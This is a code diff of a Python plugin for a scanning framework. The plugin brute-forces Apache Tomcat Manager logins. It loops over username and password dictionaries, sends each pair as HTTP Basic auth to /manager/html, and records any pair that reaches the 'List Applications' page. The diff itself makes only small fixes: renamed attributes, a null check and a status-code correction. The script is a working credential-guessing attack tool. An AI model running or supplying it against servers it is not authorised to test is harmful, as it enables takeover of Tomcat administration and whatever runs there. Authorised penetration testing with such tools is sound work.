@@ -3,17 +3,17 @@
 # @author: 'orleven'
 
 from base64 import b64encode
-from script import Script, SERVER_PORT_MAP
+from script import Script, SERVICE_PORT_MAP
 
 class POC(Script):
     def __init__(self, target=None):
-        self.server_type = SERVER_PORT_MAP.WEB
+        self.service_type = SERVICE_PORT_MAP.WEB
         self.name = 'tomcat burst'
         self.keyword = ['tomcat', 'burst']
         self.info = 'tomcat burst'
         self.type = 'weakpass'
         self.level = 'high'
-        Script.__init__(self, target=target, server_type=self.server_type)
+        Script.__init__(self, target=target, service_type=self.service_type)
 
     def prove(self):
         self.get_url()
@@ -22,7 +22,7 @@ class POC(Script):
             passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file('dict/tomcat_passwords.txt')
             url = self.base_url + 'manager/html'
             res = self.curl('get', url)
-            if res.status_code == 401 and '401 Unauthorized' in res.text and 'tomcat' in res.text:
+            if res and res.status_code == 401 and '401 Unauthorized' in res.text and 'tomcat' in res.text:
                 for linef1 in usernamedic:
                     username = linef1.strip('\r').strip('\n')
                     for linef2 in passworddic:
@@ -34,7 +34,7 @@ class POC(Script):
                             headers = {"Authorization" : 'Basic %s' % key}
                             res = self.curl('get',url,headers = headers)
                             if res:
-                                if  res.status != 401 and 'List Applications' in res.text:
+                                if  res.status_code != 401 and 'List Applications' in res.text:
                                     self.flag = 1
                                     self.req.append({"username": username,"password":password})
                                     self.res.append({"info": username + "/" + password, "key": "Authorization: " + ":".join([username,password])})
